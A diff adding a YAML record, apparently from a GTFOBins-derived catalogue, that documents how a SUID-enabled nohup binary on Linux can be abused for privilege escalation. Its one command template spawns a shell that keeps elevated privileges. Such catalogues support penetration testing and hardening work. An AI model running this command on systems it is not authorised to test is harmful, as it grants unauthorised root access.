@@ -1,0 +1,25 @@
+id: gtfobins/nohup/shell/suid
+type: binary
+platform: linux
+name: nohup
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
+  comment: This creates a `nohup.out` file in the current working directory.
+references:
+- https://gtfobins.github.io/gtfobins/nohup/
+tags:
+- linux
+- unix
+- gtfobins
